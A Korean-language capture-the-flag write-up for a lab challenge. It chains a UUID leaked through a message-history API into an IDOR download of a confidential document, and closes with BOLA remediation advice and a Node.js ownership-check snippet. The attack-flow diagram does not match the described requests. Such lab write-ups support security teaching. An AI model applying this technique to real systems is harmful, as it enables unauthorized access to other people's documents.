+++
title = "VulnABLE CTF [LUXORA] Write-up: IDOR 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "IDOR", "Gold", "BOLA", "UUID", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: IDOR 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Access Control Layer (IDOR)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/idor/gold`
- **목표**: 객체 식별자로 예측 불가능한 UUID(Universally Unique Identifier)를 사용하는 환경에서, 정보 유출(Information Disclosure) 취약점과 연계하여 타인의 민감한 문서를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/idor/gold` 페이지는 회사 내부의 기밀 문서를 다운로드하는 기능입니다. 내 문서를 다운로드하는 링크를 클릭해 봅니다.

**[요청 URL]**
```http
GET /idor/gold/download?doc_id=550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
```

**[해커의 사고 과정]**
1. 이번에는 숫자나 Base64가 아니라 길고 복잡한 **UUID v4** 문자열이 파라미터로 들어간다.
2. UUID는 $2^{122}$ 개의 조합이 가능하므로, 브루트포싱(무차별 대입)으로 다른 사람의 문서 ID를 알아내는 것은 수학적으로 불가능하다.
3. 하지만! 시스템 어딘가에 이 **UUID들이 통째로 유출되는 곳(Leakage)**이 있다면 어떨까?
4. 어드민(Admin)이나 다른 유저의 활동 내역을 볼 수 있는 API를 뒤져보자!

---

## 💥 2. 취약점 연계 탐색 (Chaining Vulnerabilities)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker (ID: 1) ] --(GET /profile?id=2)--> [ Web Server ]
                                              |-- Missing Ownership Check
                                              |-- Returns User 2's Profile
```


IDOR 공격의 핵심은 타겟의 ID를 알아내는 것입니다. 웹사이트의 다른 기능들을 이 잡듯이 뒤집니다. (Burp Suite의 Proxy History 활용)

### 💡 정보 유출 엔드포인트 발견
회원들이 서로 쪽지를 주고받는 `/api/messages` 엔드포인트에서 흥미로운 JSON 응답을 발견했습니다.

**[요청]**
```http
GET /api/messages/history HTTP/1.1
```

**[서버 응답]**
```json
{
  "messages": [
    {
      "from": "admin_super",
      "to": "user_001",
      "text": "Please review the attached confidential report.",
      "attachments": [
        {
          "filename": "Q3_Financial_Report.pdf",
          "doc_id": "f47ac10b-58cc-4372-a567-0e02b2c3d479"
        }
      ]
    }
  ]
}
```

관리자가 나에게 보낸 메시지 내역 안에, **첨부 파일의 `doc_id` (UUID)가 고스란히 노출**되어 있었습니다! 비록 내가 첨부 파일을 열 권한이 없더라도, ID 자체는 알게 된 것입니다.

---

## 🚀 3. 공격 수행 및 플래그 획득 (Exploitation)

이제 획득한 타겟의 UUID를 가지고 문서 다운로드 엔드포인트에 들이밀어 봅니다.

**[조작된 요청 URL]**
```http
GET /idor/gold/download?doc_id=f47ac10b-58cc-4372-a567-0e02b2c3d479 HTTP/1.1
```

### 🔍 서버의 응답
서버는 이 `doc_id`가 너무 복잡한 UUID이므로 "설마 남의 것을 알아맞혔겠어?" 라고 방심하며 권한(Ownership) 검증 로직을 수행하지 않고 문서를 다운로드 시켜버립니다!

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename="Q3_Financial_Report.pdf"

[PDF 내용 텍스트 렌더링...]
CONFIDENTIAL: LUXORA Q3 FINANCIALS
...
FLAG{IDOR_🥇_UUID_LEAK_BOLA_F7A1C2}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

UUID를 사용하면 브루트포스는 막을 수 있지만, 다른 기능에서 이 UUID가 유출된다면 근본적인 접근 제어(BOLA: Broken Object Level Authorization) 부재 취약점이 그대로 폭발함을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{IDOR_🥇_UUID_LEAK_BOLA_F7A1C2}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 문제는 OWASP Top 10의 부동의 1위인 **BOLA (Broken Object Level Authorization)**에 속합니다.

* **취약한 논리적 오류**
개발자는 "UUID는 맞추기 힘드니까 굳이 권한 검증 코드를 짤 필요가 없겠지"라고 스스로 타협했습니다. 하지만 시스템이 커질수록 API 어딘가에서 객체의 ID가 유출되는 일은 비일비재합니다.

* **안전한 패치 가이드**
객체의 ID가 UUID든, 암호화된 토큰이든 상관없이 **"접근하려는 객체(문서)가 현재 세션 유저의 소유인가?"**를 검증하는 로직은 선택이 아닌 **필수**입니다.

```javascript
// 다운로드 요청 시 권한 검증 필수 로직
const docId = req.query.doc_id;
const currentUserId = req.session.user_id;

// 데이터베이스에서 문서의 소유자와 현재 유저가 일치하는지 확인
const doc = await db.query(
    "SELECT * FROM documents WHERE id = $1 AND (owner_id = $2 OR is_public = true)", 
    [docId, currentUserId]
);

if (!doc) {
    return res.status(403).send("Forbidden: You don't have access to this document.");
}